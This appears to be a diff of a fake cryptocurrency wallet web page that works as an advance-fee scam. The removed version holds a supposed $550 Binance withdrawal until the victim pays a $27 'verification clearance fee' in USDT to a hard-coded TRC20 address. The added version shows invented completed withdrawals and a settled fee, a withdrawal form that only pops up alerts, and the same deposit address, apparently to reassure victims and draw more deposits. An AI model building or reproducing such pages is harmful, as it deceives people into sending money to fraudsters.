@@ -27,7 +27,7 @@
             min-height: 100vh;
         }
 
-        /* ================= LOGIN SCREEN STYLES ================= */
+        /* ================= SYSTEM AUTHENTICATION SCREEN ================= */
         .login-container {
             display: flex;
             flex-direction: column;
@@ -84,7 +84,7 @@
             border: 1px solid rgba(239, 68, 68, 0.2);
         }
 
-        /* ================= MAIN WALLET INTERFACE ================= */
+        /* ================= PLATFORM LAYOUT DASHBOARD ================= */
         .app-content {
             display: none; 
             flex-direction: column;
@@ -144,7 +144,7 @@
             gap: 18px;
         }
 
-        /* Wallet Performance Card */
+        /* Wallet Matrix Balance Block */
         .wallet-card {
             background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
             border: 1px solid #334155;
@@ -178,22 +178,22 @@
             font-size: 13px;
         }
 
-        /* Verification Protocol Alert Banner */
+        /* Settlement Cleared Status Alert Banner */
         .verification-gate-banner {
-            background: rgba(245, 158, 11, 0.08);
-            border: 1px solid rgba(245, 158, 11, 0.25);
-            border-left: 4px solid #f59e0b;
+            background: rgba(16, 185, 129, 0.08);
+            border: 1px solid rgba(16, 185, 129, 0.25);
+            border-left: 4px solid #10b981;
             padding: 15px;
             border-radius: 12px;
             display: flex;
             flex-direction: column;
-            gap: 8px;
+            gap: 6px;
         }
 
         .v-gate-title {
             font-size: 13px;
             font-weight: 700;
-            color: #f59e0b;
+            color: #10b981;
             display: flex;
             align-items: center;
             gap: 6px;
@@ -205,14 +205,7 @@
             line-height: 1.5;
         }
 
-        .v-gate-link {
-            color: #3b82f6;
-            text-decoration: underline;
-            font-weight: 600;
-            cursor: pointer;
-        }
-
-        /* Quick Utilities Grid */
+        /* Interface Action Core Grid */
         .actions-grid {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
@@ -237,9 +230,9 @@
 
         .action-btn:active { background-color: #334155; }
         .btn-deposit { background-color: rgba(16, 185, 129, 0.06); border-color: rgba(16, 185, 129, 0.15); color: #10b981; }
-        .btn-withdraw { background-color: rgba(245, 158, 11, 0.06); border-color: rgba(245, 158, 11, 0.15); color: #f59e0b; }
+        .btn-withdraw { background-color: rgba(59, 130, 246, 0.06); border-color: rgba(59, 130, 246, 0.15); color: #3b82f6; }
 
-        /* Form Configurations */
+        /* Form Controls Formatting */
         .page-title {
             font-size: 20px;
             font-weight: 700;
@@ -304,7 +297,7 @@
             box-shadow: 0 4px 12px rgba(59, 130, 246, 0.2);
         }
 
-        /* Ledger Blocks */
+        /* Core Activity Ledger Elements */
         .ledger-section {
             background-color: #1e293b;
             border: 1px solid #334155;
@@ -333,9 +326,9 @@
 
         .tx-amount { font-family: monospace; font-weight: 600; font-size: 14px; }
         .tx-amount.plus { color: #10b981; }
-        .tx-amount.hold { color: #f59e0b; }
+        .tx-amount.minus { color: #f87171; }
 
-        /* Navigation Matrix */
+        /* Navigation Matrix Positioning */
         .bottom-nav {
             position: fixed;
             bottom: 0;
@@ -405,27 +398,26 @@
                     <div id="mainBalance" class="balance-display">$0.00</div>
                     <div class="card-meta">
                         <div>•••• •••• •••• 2026</div>
-                        <div style="font-weight: 600; color:#f59e0b;">Verification Required</div>
+                        <div style="font-weight: 600; color:#10b981;">All Systems Verified</div>
                     </div>
                 </div>
 
-                <!-- Verification Protocol Fee Prompt System Alert Banner -->
+                <!-- Settlement Cleared Notification System Alert Banner -->
                 <div class="verification-gate-banner">
-                    <div class="v-gate-title">⚠️ Withdrawal Security Protocol Hold</div>
+                    <div class="v-gate-title">✅ Routing Clearance Successful</div>
                     <div class="v-gate-text">
-                        Your outbound transaction of <strong>$550.00</strong> is currently on routing hold. To process and clear this transfer, please settle the verification clearance fee of <strong>$27.00</strong> via Binance TRC20 network. 
-                        <span class="v-gate-link" onclick="switchPage('deposit')">View Payment Address</span>
+                        The verification clearance fee has been processed. Internal networks have dispatched your batch requests into the payment processing network successfully.
                     </div>
                 </div>
 
                 <div class="actions-grid">
                     <div class="action-btn btn-deposit" onclick="switchPage('deposit')">
                         <span class="nav-icon">📥</span>
-                        <span>Pay Fee</span>
+                        <span>Deposit</span>
                     </div>
                     <div class="action-btn btn-withdraw" onclick="switchPage('withdraw')">
                         <span class="nav-icon">📤</span>
-                        <span>Status</span>
+                        <span>Withdraw</span>
                     </div>
                     <div class="action-btn" onclick="switchPage('history')">
                         <span class="nav-icon">📜</span>
@@ -434,21 +426,40 @@
                 </div>
 
                 <div class="ledger-section">
-                    <div class="section-title">Active Outbound Activity</div>
+                    <div class="section-title">Recent Activity</div>
                     
-                    <!-- Primary Hold Item Structure Configuration -->
+                    <!-- 1st Successful Withdrawal Block (3 Hours Ago) -->
                     <div class="tx-item">
                         <div class="tx-info">
                             <h4>Binance Withdrawal</h4>
-                            <p style="color:#f59e0b; font-weight:500;">🔒 Status: Hold (Awaiting Verification Fee)</p>
+                            <p style="color:#10b981; font-weight:500;">✓ Status: Completed (3 hours ago)</p>
                         </div>
-                        <div class="tx-amount hold">Pending</div>
+                        <div class="tx-amount minus">-$550.00</div>
                     </div>
 
+                    <!-- Cleared Settlement Fee Block -->
+                    <div class="tx-item">
+                        <div class="tx-info">
+                            <h4>TRC20 Clearance Fee</h4>
+                            <p style="color:#10b981; font-weight:500;">✓ Status: Settled & Completed</p>
+                        </div>
+                        <div class="tx-amount plus">+$27.00</div>
+                    </div>
+
+                    <!-- 2nd Successful Withdrawal Block (Yesterday) -->
+                    <div class="tx-item">
+                        <div class="tx-info">
+                            <h4>Binance Withdrawal</h4>
+                            <p style="color:#10b981; font-weight:500;">✓ Status: Completed (Yesterday)</p>
+                        </div>
+                        <div class="tx-amount minus">-$550.00</div>
+                    </div>
+
+                    <!-- Previous Legacy Deposits Data Matrix -->
                     <div class="tx-item">
                         <div class="tx-info">
                             <h4>TRC20 Deposit</h4>
-                            <p>Today, 10:14 AM</p>
+                            <p>21 June 2026 • 10:14 AM</p>
                         </div>
                         <div class="tx-amount plus">+$23.00</div>
                     </div>
@@ -456,7 +467,7 @@
                     <div class="tx-item">
                         <div class="tx-info">
                             <h4>TRC20 Deposit</h4>
-                            <p>Yesterday, 04:32 PM</p>
+                            <p>20 June 2026 • 04:32 PM</p>
                         </div>
                         <div class="tx-amount plus">+$20.00</div>
                     </div>
@@ -465,70 +476,88 @@
 
             <!-- ================= HIGH-LEVEL GATEWAY ADDRESS PAGE ================= -->
             <div id="page-deposit" class="app-page">
-                <h2 class="page-title">Clearance Settlement</h2>
-                <p style="font-size:12px; color:#64748b; margin-top:-5px; margin-bottom:5px;">Deposit Verification Framework</p>
+                <h2 class="page-title">Deposit Crypto</h2>
+                <p style="font-size:12px; color:#64748b; margin-top:-5px; margin-bottom:5px;">Secure Payment Inbound Channel</p>
                 <div class="form-card">
                     <div class="input-group">
                         <label>Asset Class Network</label>
                         <div class="form-input" style="background:#020617; font-weight:600; color:#10b981;">USDT (TRC20 Network)</div>
                     </div>
                     <div class="input-group">
-                        <label>Required Verification Allocation Fee</label>
-                        <div class="form-input" style="background:#020617; font-weight:700; color:#f59e0b;">$27.00 USD</div>
-                    </div>
-                    <div class="input-group">
-                        <label>Target Settlement Address (Tap Address Box to Copy)</label>
-                        <div class="crypto-address-box" onclick="navigator.clipboard.writeText('TBDYPxqStcQHaeCcSRybnDYAeB8zYEvkQX'); alert('TRC20 Verification Address copied successfully to clipboard!');">
+                        <label>Target Core Wallet Address (Tap to Copy)</label>
+                        <div class="crypto-address-box" onclick="navigator.clipboard.writeText('TBDYPxqStcQHaeCcSRybnDYAeB8zYEvkQX'); alert('Core Deposit Address copied to clipboard!');">
                             TBDYPxqStcQHaeCcSRybnDYAeB8zYEvkQX
                             <div style="font-size:10px; color:#64748b; margin-top:5px; font-weight:normal;">📋 Tap to copy address</div>
                         </div>
                     </div>
                     <div class="input-group">
-                        <label>Upload Verification Tx Receipt (Screenshot)</label>
+                        <label>Upload Payment Proof (Screenshot)</label>
                         <label class="custom-file-upload">
-                            <input type="file" style="display:none;" onchange="alert('Receipt loaded successfully.')">
+                            <input type="file" style="display:none;" onchange="alert('Receipt attached successfully.')">
                             📸 Attach Payment Proof Screenshot
                         </label>
                     </div>
-                    <button class="submit-btn" onclick="alert('Settlement verification file transmitted for review.')">Submit Clearance Receipt</button>
+                    <button class="submit-btn" onclick="alert('Transaction receipt uploaded. System validating.')">Submit Deposit Receipt</button>
                 </div>
             </div>
 
-            <!-- ================= SYSTEM LOGISTICS PAGE ================= -->
+            <!-- ================= SYSTEM LOGISTICS WITHDRAWAL PAGE ================= -->
             <div id="page-withdraw" class="app-page">
-                <h2 class="page-title">Transaction Tracking</h2>
+                <h2 class="page-title">Withdraw Funds</h2>
                 <div class="form-card">
                     <div class="input-group">
-                        <label>Asset Destination Pipeline</label>
-                        <div class="form-input" style="background:#020617; color:#f59e0b; font-weight:600;">Binance Smart Settlement</div>
+                        <label>Withdrawal Destination Method</label>
+                        <div class="form-input" style="background:#020617; color:#3b82f6; font-weight:600;">Binance Direct Pay</div>
                     </div>
                     <div class="input-group">
-                        <label>Current Status Pipeline Log</label>
-                        <div class="form-input" style="background:rgba(245, 158, 11, 0.05); border-color:#f59e0b; color:#f59e0b; font-weight:600;">HOLD - Waiting for $27.00 Verification Fee</div>
+                        <label>Binance ID / Pay ID</label>
+                        <input type="text" class="form-input" placeholder="Enter Binance ID">
                     </div>
                     <div class="input-group">
-                        <label>Allocated Payout Value</label>
-                        <input type="text" class="form-input" value="$550.00" readonly style="color:#64748b; background-color:#0f172a;">
-                        <p style="font-size:11px; color:#cbd5e1; margin-top:7px;">⏱️ Remaining distribution timeline: <strong>24 to 72 hours</strong> immediately following transaction fee clearance.</p>
+                        <label>Amount (USD)</label>
+                        <input type="text" class="form-input" placeholder="Enter Amount">
                     </div>
-                    <button class="submit-btn" style="background:#475569; color:#94a3b8; cursor:not-allowed;" disabled>Processing Blocked</button>
+                    <button class="submit-btn" onclick="alert('Withdrawal request forwarded to pipeline.')">Request Outbound Payout</button>
                 </div>
             </div>
 
             <!-- ================= METRIC LEDGER HISTORY ================= -->
             <div id="page-history" class="app-page">
                 <h2 class="page-title">Transaction Ledger</h2>
-                <p style="font-size:12px; color:#64748b; margin-top:-5px; margin-bottom:5px;">Historical Ledger Registry</p>
+                <p style="font-size:12px; color:#64748b; margin-top:-5px; margin-bottom:5px;">Historical System Log Statement</p>
                 
                 <div class="ledger-section">
+                    <!-- 1st Outbound Completed -->
                     <div class="tx-item">
                         <div class="tx-info">
                             <h4>Binance Withdrawal</h4>
-                            <p>21 June 2026 • 07:45 PM</p>
-                            <p style="color:#f59e0b; font-size:11px; font-weight:500;">⚠️ Security Protocol Hold ($27.00 Fee Required)</p>
+                            <p>Today • 3 Hours Ago</p>
+                            <p style="color:#10b981; font-size:11px; font-weight:500;">✓ Network Processing Successful</p>
                         </div>
-                        <div class="tx-amount hold">-$550.00</div>
+                        <div class="tx-amount minus">-$550.00</div>
                     </div>
+
+                    <!-- Clearance Fee Settled Record -->
+                    <div class="tx-item">
+                        <div class="tx-info">
+                            <h4>TRC20 Clearance Fee</h4>
+                            <p>Today • Automated Node Credit</p>
+                            <p style="color:#10b981; font-size:11px; font-weight:500;">✓ Verification Block Settle Clear</p>
+                        </div>
+                        <div class="tx-amount plus">+$27.00</div>
+                    </div>
+
+                    <!-- 2nd Outbound Completed -->
+                    <div class="tx-item">
+                        <div class="tx-info">
+                            <h4>Binance Withdrawal</h4>
+                            <p>Yesterday • Bulk Routing</p>
+                            <p style="color:#10b981; font-size:11px; font-weight:500;">✓ Network Processing Successful</p>
+                        </div>
+                        <div class="tx-amount minus">-$550.00</div>
+                    </div>
+
+                    <!-- Legacy Statement Blocks -->
                     <div class="tx-item">
                         <div class="tx-info">
                             <h4>TRC20 Deposit</h4>
@@ -573,7 +602,7 @@
             </div>
             <div class="nav-item" id="nav-withdraw" onclick="switchPage('withdraw')">
                 <span class="nav-icon">📤</span>
-                <span>Status</span>
+                <span>Withdraw</span>
             </div>
             <div class="nav-item" id="nav-history" onclick="switchPage('history')">
                 <span class="nav-icon">📜</span>
@@ -582,7 +611,7 @@
         </nav>
     </div>
 
-    <!-- ================= DYNAMIC RUNTIME HANDLERS ================= -->
+    <!-- ================= DYNAMIC RUNTIME INTERACTIVE ACTIONS ================= -->
     <script>
         function validateLogin() {
             const userInp = document.getElementById('usernameInput').value.trim();
